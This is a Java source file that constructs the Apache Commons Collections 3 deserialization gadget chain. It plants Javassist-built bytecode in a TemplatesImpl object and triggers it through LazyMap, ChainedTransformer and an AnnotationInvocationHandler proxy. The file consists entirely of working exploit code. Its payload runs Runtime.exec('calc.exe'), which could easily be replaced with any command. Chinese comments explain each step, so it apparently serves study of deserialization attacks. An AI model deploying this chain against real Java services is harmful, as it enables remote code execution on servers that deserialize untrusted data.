import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {

        final byte[] byteCode = makeByteCode();
        TemplatesImpl templates = new TemplatesImpl();
        Class clz = TemplatesImpl.class;
        Field _nameField = clz.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templates,"achilles");
        Field _bytecodesField = clz.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        _bytecodesField.set(templates,new byte[][]{byteCode});
        Field _tfactoryField = clz.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templates,new TransformerFactoryImpl());

        //构造恶意数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        //获取恶意数组
        Transformer transformerChain = new ChainedTransformer(transformers);
        //将恶意方法作为修饰元素的方法
        Map lazyMap = org.apache.commons.collections.map.LazyMap.decorate(new HashMap(),transformerChain);

        //反射获取并实例化动态代理
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler LazyMap_handler = (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);

        //代理 lazyMap的接口,使用 LazyMap_handler代理
        //proxyMap在调用到 Map接口中的任意方法之后将会执行 LazyMap_handler的 invoke()方法
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),lazyMap.getClass().getInterfaces(),LazyMap_handler);

        //将 proxyMap带入到 sun.reflect.annotation.AnnotationInvocationHandler类中,去调用 entrySet()方法
        Object handler = constructor.newInstance(Retention.class,proxyMap);
        //序列化
//        FileStream.writeSer(handler,"CC3.ser");
        //反序列化
        FileStream.readSer("CC3.ser");
    }

    public static byte[] makeByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(MyTemplate.class.getName());
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName("NormalClass");
        return ctClass.toBytecode();
    }
}
